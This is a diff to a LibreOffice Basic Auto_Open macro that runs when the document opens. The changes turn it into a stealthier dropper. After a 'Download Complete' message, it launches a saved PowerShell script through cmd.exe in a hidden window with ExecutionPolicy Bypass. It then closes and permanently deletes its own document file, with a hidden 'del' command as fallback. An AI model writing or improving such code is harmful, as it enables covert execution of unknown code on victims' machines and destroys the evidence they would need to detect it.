@@ -31,40 +31,36 @@ Sub Auto_Open()
                "Location: " & savePath & Chr(13) & _
                "Join our security Discord: discord.gg/cybersec", 64, "Download Complete"
         
-        ' Try multiple approaches to run PowerShell script
+        ' Run the PowerShell script completely hidden and ensure self-destruction
         Dim result As Integer
         Dim cmdLine As String
+        Dim currentDocPath As String
         
-        ' Method 1: Direct PowerShell execution
-        cmdLine = "powershell.exe -WindowStyle Normal -ExecutionPolicy Bypass -File """ & savePath & """"
-        result = Shell(cmdLine, 1, "", True)
+        ' Get document path BEFORE closing (important!)
+        currentDocPath = ConvertFromURL(ThisComponent.getURL())
         
-        ' Method 2: If method 1 fails, try with cmd.exe
-        If result = 0 Then
-            cmdLine = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """"
-            result = Shell(cmdLine, 1, "", True)
+        ' Use cmd.exe with hidden window - this method works
+        cmdLine = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """"
+        result = Shell(cmdLine, 0, "", False)  ' Set bSync to False to avoid blocking
+        
+        ' Wait a moment for PowerShell to start
+        Wait 1000
+        
+        ' ALWAYS self-destruct after launching (regardless of result)
+        ' Because hidden processes don't return reliable exit codes
+        
+        ' Close the current document without saving
+        On Error Resume Next
+        ThisComponent.close(False)
+        
+        ' Delete the LibreOffice document file permanently
+        If currentDocPath <> "" Then
+            Kill currentDocPath
         End If
         
-        ' Method 3: Alternative syntax
-        If result = 0 Then
-            result = Shell("cmd.exe", 1, "/c ""powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", True)
-        End If
-        
-        MsgBox "PowerShell execution attempted. Exit code: " & result
-        
-        ' If PowerShell executed successfully, clean up this document
-        If result <> 0 Then
-            ' Get the current document's file path
-            Dim currentDocPath As String
-            currentDocPath = ConvertFromURL(ThisComponent.getURL())
-            
-            ' Close the current document without saving
-            ThisComponent.close(False)
-            
-            ' Delete the LibreOffice document file to keep system clean
-            If currentDocPath <> "" Then
-                Kill currentDocPath
-            End If
+        ' If Kill doesn't work, try system delete
+        If Dir(currentDocPath) <> "" Then
+            Shell "cmd.exe /c del """ & currentDocPath & """", 0, "", False
         End If
         
     Else
